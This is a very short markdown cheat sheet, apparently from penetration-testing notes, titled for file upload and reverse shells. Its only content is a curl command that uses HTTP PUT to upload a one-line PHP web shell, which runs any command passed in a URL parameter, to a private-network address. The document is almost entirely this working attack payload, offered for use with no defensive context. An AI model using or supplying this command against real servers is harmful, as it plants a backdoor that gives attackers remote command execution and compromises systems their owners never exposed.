#File upload & Reverseshell

## Curl command to upload a file using PUT METHOD 

curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://192.168.1.9/test/shell.php
